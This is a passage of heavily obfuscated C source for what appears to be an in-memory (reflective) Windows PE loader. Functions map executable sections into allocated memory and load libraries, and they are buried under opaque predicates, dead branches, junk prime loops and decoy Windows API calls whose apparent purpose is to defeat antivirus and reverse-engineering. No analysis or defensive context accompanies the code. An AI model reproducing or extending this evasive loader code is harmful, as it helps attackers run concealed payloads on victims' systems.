                  {
                    void * vcf5ea1229bf552223704329b0fa51af3 = (void *) 0xef717c8e;
                    if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                    {
                      void * ved16d7fc35b15de873a73269f18fe349 = (void *) 0x8ad8114f;
                      void * v3b75b606a24ba0ac05616bb6a18a1bd7 = (void *) 0x1db4f776;
                      unsigned long v63ad1975a2c5bd65b4c2a1c7da6fde00 = (unsigned long) 0xc981180a;
                      unsigned long v2275000a31e4edcd96bdbe371ce1abf6 = (unsigned long) 0xaa6b9115;
                      v2275000a31e4edcd96bdbe371ce1abf6 = GetModuleFileNameA(ved16d7fc35b15de873a73269f18fe349, v3b75b606a24ba0ac05616bb6a18a1bd7, v63ad1975a2c5bd65b4c2a1c7da6fde00);
                    }
                    long v3e5d058dc7b33974601a52995149e1b9 = (long) 0x594aee8c;
                    if (!(((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2))))
                    {
                      vda0ca58500c243324db410d4d3f1ee40_computation_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque || vdd26640f98a4af6142e254c853813c66_useless_opaque;
                      v2d0a525c2453b050f6fb934132ad80ea_true_opaque = vbc0441025b6ff48f69b776e86e0cc867_random_opaque + v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque;
                      ve9b0a654b2b86260e2f20abedb6c7ab1_computation_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque * vb9395e8639ce69511f2a4194f8da9db1_computation_opaque;
                      v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = vbc0441025b6ff48f69b776e86e0cc867_random_opaque + v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque;
                      vdd26640f98a4af6142e254c853813c66_useless_opaque = vdd26640f98a4af6142e254c853813c66_useless_opaque - v2d0a525c2453b050f6fb934132ad80ea_true_opaque;
                    }
                    v3e5d058dc7b33974601a52995149e1b9 = RoUnregisterForApartmentShutdown(vcf5ea1229bf552223704329b0fa51af3);
                    if (!((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25))))
                    {
                      unsigned long v91c37e195282af1b6b33fedb167feb12 = (unsigned long) 0x648a158d;
                      void * v600fa82e783ed301ba2b7c8a239e738f = (void *) 0x738a5c92;
                      int v52c53988f11106c1f019c7f8a8c68eda = (int) 0x6342215e;
                      void * v62d20f0dddf287e777598b52dd783115 = (void *) 0xc5add13c;
                      int v63ae8dd9210d0509905b0643d2ae73d5 = (int) 0x782e4d2f;
                      int vf0b2e3c6aedcec5a7df26e680b11d2cc = (int) 0x4b26d240;
                      vf0b2e3c6aedcec5a7df26e680b11d2cc = IdnToNameprepUnicode(v91c37e195282af1b6b33fedb167feb12, v600fa82e783ed301ba2b7c8a239e738f, v52c53988f11106c1f019c7f8a8c68eda, v62d20f0dddf287e777598b52dd783115, v63ae8dd9210d0509905b0643d2ae73d5);
                    }
                  }
                  replacement_memcpy(dest, pe_data + source_sections[i].PointerToRawData, source_sections[i].SizeOfRawData);
                }
                else
                {
                  replacement_memset(dest, 0, source_sections[i].Misc.VirtualSize);
                  if (((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2)))
                  {
                    if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                    {
                      if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                      {
                        void * v11da3899b7df66718e06aeab981e200d = (void *) 0xca017f04;
                        long v1eaf5697637ffd3157e615b6ad38d7dc = (long) 0x9ff9ccd9;
                        v1eaf5697637ffd3157e615b6ad38d7dc = RoUnregisterForApartmentShutdown(v11da3899b7df66718e06aeab981e200d);
                      }
                      void * v4cf4975c4b93656fc3348eec46d5f15b = (void *) 0x19e6fe1b;
                      int v2c6d12c177fd3c811b102a8d4ed336a0 = (int) 0xb03c39fc;
                      v2c6d12c177fd3c811b102a8d4ed336a0 = RemoveDllDirectory(v4cf4975c4b93656fc3348eec46d5f15b);
                    }
                  }
                }
                if (!v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
                {
                  unsigned long v74358fb5f22dc5b242737be5e49a47fb = (unsigned long) 0x3315dfb4;
                  unsigned long va7a552d157e5dfcd37f2b90bc2641eea = (unsigned long) 0x18171b96;
                  void * v3030b1aac226f06db99d07658c7663dd = (void *) 0x93598c08;
                  if (((v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque == ((unsigned int) 2)))
                  {
                    int vb9807644478e08624dcefb7985a705ed = (int) 0xafb23bc1;
                    int v0932224a535ac6cb08674ef5b6b3de57 = (int) 0x1f2cce2b;
                    v0932224a535ac6cb08674ef5b6b3de57 = GetLocaleInfoW(v74358fb5f22dc5b242737be5e49a47fb, va7a552d157e5dfcd37f2b90bc2641eea, v3030b1aac226f06db99d07658c7663dd, vb9807644478e08624dcefb7985a705ed);
                  }
                }
              }
            }

            if (!((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25))))
            {
              if (v2d0a525c2453b050f6fb934132ad80ea_true_opaque)
              {
                vb9395e8639ce69511f2a4194f8da9db1_computation_opaque = vda0ca58500c243324db410d4d3f1ee40_computation_opaque <= ((unsigned int) 101);
                if ((((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 9)) + ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 16))) == ((vbc0441025b6ff48f69b776e86e0cc867_random_opaque * vbc0441025b6ff48f69b776e86e0cc867_random_opaque) * ((unsigned int) 25)))
                {
                  v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = v52df29b53e853b6bb544fae95a7a6a91_computation_opaque < ((unsigned int) 117);
                  v52df29b53e853b6bb544fae95a7a6a91_computation_opaque = v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque + ((unsigned int) 95);
                  vdd26640f98a4af6142e254c853813c66_useless_opaque = ve00e7bd6959036f18010261fc95b40d9_useless_opaque <= vda0ca58500c243324db410d4d3f1ee40_computation_opaque;
                  v4bb6fec96617bacf9059f6e5c18fbe99_useless_opaque = v92a81e4615ee7d2a1d96e6c4ae48ab98_prime_opaque <= ve00e7bd6959036f18010261fc95b40d9_useless_opaque;
                }
              }
            }
          }
        }
      }
    }
  }
}

char *copy_to_pages(const char *pe_data)
{
  {
    unsigned int va0dff52a4f1dde483638b52986255d04_useless_opaque = (unsigned int) 2827730857;
    unsigned int v5623656865b2830d7ce06ad590c219a7_random_opaque = (unsigned int) (&va0dff52a4f1dde483638b52986255d04_useless_opaque);
    {
      {
        IMAGE_DOS_HEADER *pe_dos_header = (IMAGE_DOS_HEADER *) pe_data;
        IMAGE_NT_HEADERS *pe_nt_header = (IMAGE_NT_HEADERS *) (pe_data + pe_dos_header->e_lfanew);
        char *image_base = ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[3])(0, pe_nt_header->OptionalHeader.SizeOfImage, 0x2000 | 0x1000, 0x04);
        if (image_base == 0)
          return 0;
        copy_to_virtual(pe_data, image_base);
        return image_base;
        unsigned int v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque = (unsigned int) 1429477941;
        unsigned int vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = (unsigned int) (&v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque);
        unsigned int v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque = (((vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque * vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque) + vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
        {
          vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque < v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque;
          if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
          {
            vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque == v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque;
            vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque % ((unsigned int) 57);
            v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque = v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque || va0dff52a4f1dde483638b52986255d04_useless_opaque;
            if ((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25)))
            {
              vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque * ((unsigned int) 77);
              v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque = v5623656865b2830d7ce06ad590c219a7_random_opaque | v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque;
              va0dff52a4f1dde483638b52986255d04_useless_opaque = v5623656865b2830d7ce06ad590c219a7_random_opaque * v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque;
            }
          }
          vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque || va0dff52a4f1dde483638b52986255d04_useless_opaque;
          va0dff52a4f1dde483638b52986255d04_useless_opaque = vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque || v5623656865b2830d7ce06ad590c219a7_random_opaque;
          va0dff52a4f1dde483638b52986255d04_useless_opaque = vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque | ((unsigned int) 35);
          vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque != va0dff52a4f1dde483638b52986255d04_useless_opaque;
          if (!v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque)
          {
            v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque = v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque < v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque;
            v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque = v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque - v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque;
            vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque % v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque;
            vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque | ((unsigned int) 50);
            v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque = v5623656865b2830d7ce06ad590c219a7_random_opaque <= v3cfe255b898f57e164eaf8d1db1c46b5_true_opaque;
            v5623656865b2830d7ce06ad590c219a7_random_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque <= vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque;
            va0dff52a4f1dde483638b52986255d04_useless_opaque = vdc64d4268a6aa67036a51b5f4328dd3c_computation_opaque <= v112d4dc35f4e416d1b04409e5abde9d5_useless_opaque;
          }
        }
      }
      unsigned int v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque = (unsigned int) 1850317973;
      unsigned int v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque = (unsigned int) 2339227227;
      unsigned int v04d6dbafad197b60f087045c8004d755_computation_opaque = (unsigned int) 0;
      unsigned int v44056080a25fee491269cf0fa5e4da41_computation_opaque = (unsigned int) 3;
      unsigned int v3ae9212de525b063a583474f49cb9b01_computation_opaque = (unsigned int) (&v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque);
      v3ae9212de525b063a583474f49cb9b01_computation_opaque = (v3ae9212de525b063a583474f49cb9b01_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v3ae9212de525b063a583474f49cb9b01_computation_opaque < ((unsigned int) 3))
      {
        v3ae9212de525b063a583474f49cb9b01_computation_opaque = (unsigned int) 3;
        if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
        {
          if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
          {
            v3ae9212de525b063a583474f49cb9b01_computation_opaque = v5623656865b2830d7ce06ad590c219a7_random_opaque % v04d6dbafad197b60f087045c8004d755_computation_opaque;
            if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
            {
              v3ae9212de525b063a583474f49cb9b01_computation_opaque = v04d6dbafad197b60f087045c8004d755_computation_opaque < v5623656865b2830d7ce06ad590c219a7_random_opaque;
              v44056080a25fee491269cf0fa5e4da41_computation_opaque = v04d6dbafad197b60f087045c8004d755_computation_opaque / v5623656865b2830d7ce06ad590c219a7_random_opaque;
            }
            va0dff52a4f1dde483638b52986255d04_useless_opaque = v44056080a25fee491269cf0fa5e4da41_computation_opaque + v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque;
            v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque = v44056080a25fee491269cf0fa5e4da41_computation_opaque <= va0dff52a4f1dde483638b52986255d04_useless_opaque;
            v3ae9212de525b063a583474f49cb9b01_computation_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque || v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque;
          }
          v5623656865b2830d7ce06ad590c219a7_random_opaque = v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque != v04d6dbafad197b60f087045c8004d755_computation_opaque;
          v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque = v44056080a25fee491269cf0fa5e4da41_computation_opaque | v5623656865b2830d7ce06ad590c219a7_random_opaque;
          v3ae9212de525b063a583474f49cb9b01_computation_opaque = v3ae9212de525b063a583474f49cb9b01_computation_opaque <= ((unsigned int) 60);
          va0dff52a4f1dde483638b52986255d04_useless_opaque = va0dff52a4f1dde483638b52986255d04_useless_opaque <= v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque;
          va0dff52a4f1dde483638b52986255d04_useless_opaque = v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque == v04d6dbafad197b60f087045c8004d755_computation_opaque;
        }
      }
      while (v04d6dbafad197b60f087045c8004d755_computation_opaque != ((unsigned int) 1))
      {
        v3ae9212de525b063a583474f49cb9b01_computation_opaque += (unsigned int) 2;
        v04d6dbafad197b60f087045c8004d755_computation_opaque = (unsigned int) 1;
        if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
        {
          void * veb0aad185da57ea10b3e97b0f3299175 = (void *) 0xa1396ddb;
          void * v61067564b8364c3fe3e57daf6ef66784 = (void *) 0x2b5863a8;
          unsigned long v0d93ba5a3bbec7ba872e4b77e4056d1d = (unsigned long) 0xd29f5bc7;
          if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
          {
            v04d6dbafad197b60f087045c8004d755_computation_opaque = v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque + ((unsigned int) 100);
            v44056080a25fee491269cf0fa5e4da41_computation_opaque = v3ae9212de525b063a583474f49cb9b01_computation_opaque % ((unsigned int) 54);
            v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque = v5623656865b2830d7ce06ad590c219a7_random_opaque + va0dff52a4f1dde483638b52986255d04_useless_opaque;
            v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque = v04d6dbafad197b60f087045c8004d755_computation_opaque % v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque;
          }
          unsigned long v4a2107cfe8475ad1ebe47fd720a838d8 = (unsigned long) 0xc662ae65;
          v4a2107cfe8475ad1ebe47fd720a838d8 = GetModuleFileNameA(veb0aad185da57ea10b3e97b0f3299175, v61067564b8364c3fe3e57daf6ef66784, v0d93ba5a3bbec7ba872e4b77e4056d1d);
        }
        v44056080a25fee491269cf0fa5e4da41_computation_opaque = (unsigned int) 3;
        if ((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25)))
        {
          if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
          {
            v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque = v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque / va0dff52a4f1dde483638b52986255d04_useless_opaque;
            va0dff52a4f1dde483638b52986255d04_useless_opaque = v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque % ((unsigned int) 2);
            if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
            {
              v44056080a25fee491269cf0fa5e4da41_computation_opaque = v4e0c5401ef04dbcd9ff559c66b78b45e_useless_opaque < va0dff52a4f1dde483638b52986255d04_useless_opaque;
            }
            v44056080a25fee491269cf0fa5e4da41_computation_opaque = v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque || v5623656865b2830d7ce06ad590c219a7_random_opaque;
            v3ae9212de525b063a583474f49cb9b01_computation_opaque = v3ae9212de525b063a583474f49cb9b01_computation_opaque || v44056080a25fee491269cf0fa5e4da41_computation_opaque;
            va0dff52a4f1dde483638b52986255d04_useless_opaque = v44056080a25fee491269cf0fa5e4da41_computation_opaque || v04d6dbafad197b60f087045c8004d755_computation_opaque;
          }
          while ((v44056080a25fee491269cf0fa5e4da41_computation_opaque * v44056080a25fee491269cf0fa5e4da41_computation_opaque) <= v3ae9212de525b063a583474f49cb9b01_computation_opaque)
          {
            if ((v3ae9212de525b063a583474f49cb9b01_computation_opaque % v44056080a25fee491269cf0fa5e4da41_computation_opaque) == ((unsigned int) 0))
            {
              v04d6dbafad197b60f087045c8004d755_computation_opaque = (unsigned int) 0;
            }
            v44056080a25fee491269cf0fa5e4da41_computation_opaque = v44056080a25fee491269cf0fa5e4da41_computation_opaque + ((unsigned int) 2);
            if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
            {
              unsigned long vd0b167a411e9de22a3c413d9bd8a349a = (unsigned long) 0xbf405ac9;
              void * va6c70d9edebccf167d3c6d9a8e649622 = (void *) 0x7cc7059c;
              if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
              {
                void * vd97a5f851cc41906c8e0e941dd5366ab = (void *) 0xe8b56d86;
                if (!((((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 9)) + ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 16))) == ((v5623656865b2830d7ce06ad590c219a7_random_opaque * v5623656865b2830d7ce06ad590c219a7_random_opaque) * ((unsigned int) 25))))
                {
                  void * v695ad9fc7c405d011090ac39bbcc53fb = (void *) 0xb1f70815;
                  long vd3b7f0911f751c806945a896bd48ea53 = (long) 0xa07c35ca;
                  vd3b7f0911f751c806945a896bd48ea53 = RoUnregisterForApartmentShutdown(v695ad9fc7c405d011090ac39bbcc53fb);
                }
                long vd7fb5c17adeb932cad6aa547a7048e03 = (long) 0x53f5a521;
                vd7fb5c17adeb932cad6aa547a7048e03 = RoUnregisterForApartmentShutdown(vd97a5f851cc41906c8e0e941dd5366ab);
              }
              int va46b555712c162e29211247ddacee24b = (int) 0x2bd96fe6;
              void * va5fc163846a8a840247706752ac41f6e = (void *) 0x6068a355;
              int v7693a4797f1f9e955257f13eea94a792 = (int) 0x4b329015;
              int va202d756e7ae5810d91ffa37f98b7ea1 = (int) 0xe33c670a;
              va202d756e7ae5810d91ffa37f98b7ea1 = IdnToNameprepUnicode(vd0b167a411e9de22a3c413d9bd8a349a, va6c70d9edebccf167d3c6d9a8e649622, va46b555712c162e29211247ddacee24b, va5fc163846a8a840247706752ac41f6e, v7693a4797f1f9e955257f13eea94a792);
            }
          }

        }
      }

      unsigned int v07e194deb7938e847dcba7c82d9bbd38_prime_opaque = v3ae9212de525b063a583474f49cb9b01_computation_opaque;
      unsigned int vc11b07caac398a0e511f09848aabbd14_computation_opaque = (unsigned int) (&v1030ea9759292ec09f5a2cdafd3ca6b8_useless_opaque);
      unsigned int v1bd2b0be25497e9e2e2fbc12cf7c2a5c_true_opaque = (((vc11b07caac398a0e511f09848aabbd14_computation_opaque * vc11b07caac398a0e511f09848aabbd14_computation_opaque) + vc11b07caac398a0e511f09848aabbd14_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
    }
  }
}

int load_libraries(in_memory_pe *new_pe)
{
  {
    unsigned int v47f7cc578d96325420a92a198f8a37ea_useless_opaque = (unsigned int) 1069492788;
    unsigned int vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = (unsigned int) 0;
    unsigned int ve609b7fe6984b8a85f770a041153c694_computation_opaque = (unsigned int) 3;
    unsigned int v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = (unsigned int) (&v47f7cc578d96325420a92a198f8a37ea_useless_opaque);
    v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = (v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque < ((unsigned int) 3))
    {
      v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = (unsigned int) 3;
    }
    while (vff8febe68dcfb359a14f4f7f6865372d_computation_opaque != ((unsigned int) 1))
    {
      v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque += (unsigned int) 2;
      vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = (unsigned int) 1;
      ve609b7fe6984b8a85f770a041153c694_computation_opaque = (unsigned int) 3;
      unsigned int v6197b4a1af591a8716265d56858bb4e7_useless_opaque = (unsigned int) 2953836368;
      unsigned int vc8d4e41cc3b9583e4b16e3e3a3d1a428_computation_opaque = (unsigned int) 0;
      unsigned int ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque = (unsigned int) 3;
      unsigned int v89ebf75852b00c55c017973b7dc4da29_computation_opaque = (unsigned int) (&v6197b4a1af591a8716265d56858bb4e7_useless_opaque);
      v89ebf75852b00c55c017973b7dc4da29_computation_opaque = (v89ebf75852b00c55c017973b7dc4da29_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v89ebf75852b00c55c017973b7dc4da29_computation_opaque < ((unsigned int) 3))
      {
        v89ebf75852b00c55c017973b7dc4da29_computation_opaque = (unsigned int) 3;
      }
      while (vc8d4e41cc3b9583e4b16e3e3a3d1a428_computation_opaque != ((unsigned int) 1))
      {
        v89ebf75852b00c55c017973b7dc4da29_computation_opaque += (unsigned int) 2;
        vc8d4e41cc3b9583e4b16e3e3a3d1a428_computation_opaque = (unsigned int) 1;
        ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque = (unsigned int) 3;
        while ((ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque * ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque) <= v89ebf75852b00c55c017973b7dc4da29_computation_opaque)
        {
          if ((v89ebf75852b00c55c017973b7dc4da29_computation_opaque % ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque) == ((unsigned int) 0))
          {
            vc8d4e41cc3b9583e4b16e3e3a3d1a428_computation_opaque = (unsigned int) 0;
          }
          ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque = ve0c0b7100a0807a6f44f56c1aa64e0fc_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v059d122f3e8b86424a18796664ff3d31_prime_opaque = v89ebf75852b00c55c017973b7dc4da29_computation_opaque;
      while ((ve609b7fe6984b8a85f770a041153c694_computation_opaque * ve609b7fe6984b8a85f770a041153c694_computation_opaque) <= v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque)
      {
        if ((v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque % ve609b7fe6984b8a85f770a041153c694_computation_opaque) == ((unsigned int) 0))
        {
          if (((v059d122f3e8b86424a18796664ff3d31_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v059d122f3e8b86424a18796664ff3d31_prime_opaque == ((unsigned int) 2)))
